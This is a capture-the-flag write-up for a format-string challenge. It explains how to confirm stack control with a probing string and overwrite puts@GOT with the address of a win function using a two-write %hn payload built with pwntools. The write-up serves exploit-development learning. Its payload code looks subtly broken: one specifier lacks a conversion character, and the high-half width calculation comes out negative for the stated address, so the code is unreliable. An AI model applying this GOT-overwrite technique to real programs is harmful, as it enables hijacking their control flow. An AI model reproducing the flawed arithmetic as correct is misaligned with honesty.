# Challenge `Calling Functions Again` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - puts function
- Impact:
  - allows to call functions

## Steps to reproduce

The main function calls a function which reads the user input to a buffer then exits the program.
Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
we can verify that the 7th register is filled with `41414141` (the value of `AAAA`) which tells us that we control the 7th register.

To call the `win` function we need to overwrite the `puts@GOT` address with the address of the `win` function.
Like previous challenges, we can write the address two bytes at a time using the `%hn` specifier.

We can get the address of the `win` function and the `puts@GOT` using:
```py
elf = ELF("07_call_functions")
win = elf.symbols['win']  # address of the win function -> 0x8049216
puts_address = elf.got['puts']
```

Then, we can write the address two bytes at a time using the following payload:
```py
win_low = (win & 0xffff) - 8  # - 8 bytes due to the two p32 addresses in the payload (each one is 4 bytes)
win_high = (win >> 16) - win_low

payload =  p32(puts_address) + p32(puts_address + 2) + f"%{win_low}x%7$hn".encode() + f"%{win_high}%8$hn".encode()
```

Then, we send the payload and we get the flag.

## Implementation

Full implementation can be found [here](calling-functions-again.py).